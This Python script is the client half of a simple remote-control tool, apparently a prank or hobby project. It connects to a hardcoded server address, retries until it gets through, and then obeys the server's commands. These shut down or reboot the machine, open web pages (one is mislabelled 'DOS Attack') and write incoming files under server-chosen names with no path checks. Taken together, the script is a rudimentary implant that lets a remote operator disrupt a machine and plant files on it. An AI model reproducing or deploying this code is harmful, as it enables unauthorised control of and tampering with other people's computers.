import time
import socket
import os
import platform

# Client Code

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "10.250.14.55"
            port = 8080
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

s = connect_to_server()

while True:
    try:
        command = s.recv(1024).decode().strip()
        if not command:
            print("Connection closed by server.")
            break
        
        if command == "shutdown":
            os.system("shutdown -s -t 00" if platform.system() == "Windows" else "shutdown now")
        elif command == "restart":
            os.system("shutdown -r -t 00" if platform.system() == "Windows" else "reboot")
        elif command == "DOS Attack":
            os.system("start msedge.exe https://www.example.com" if platform.system() == "Windows" else "xdg-open https://www.example.com")
        elif command == "Shantabhai":
            os.system("start msedge.exe https://www.youtube.com/watch?v=Uk65cmPGl8s" if platform.system() == "Windows" else "xdg-open https://www.youtube.com/watch?v=Uk65cmPGl8s")
        elif command == "file_transfer":
            file_info = s.recv(1024).decode().strip()
            if "|" not in file_info:
                print(f"Invalid file info received: {file_info}")
                break
            
            file_name, file_size = file_info.split("|", 1)
            try:
                file_size = int(file_size)
            except ValueError:
                print("Invalid file size received.")
                break
            
            s.sendall("READY".encode())
            
            with open(file_name, "wb") as f:
                received_size = 0
                while received_size < file_size:
                    data = s.recv(1024)
                    if not data:
                        print("Connection lost during file transfer.")
                        break
                    f.write(data)
                    received_size += len(data)
            
            if received_size == file_size:
                print(f"File {file_name} received successfully.")
            else:
                print("File transfer incomplete.")
        elif command == "exit":
            print("Server requested disconnection.")
            s.close()
            break
        else:
            print("Unknown command received.")
    except socket.error as e:
        print(f"Socket error: {e}")
        break

s.close()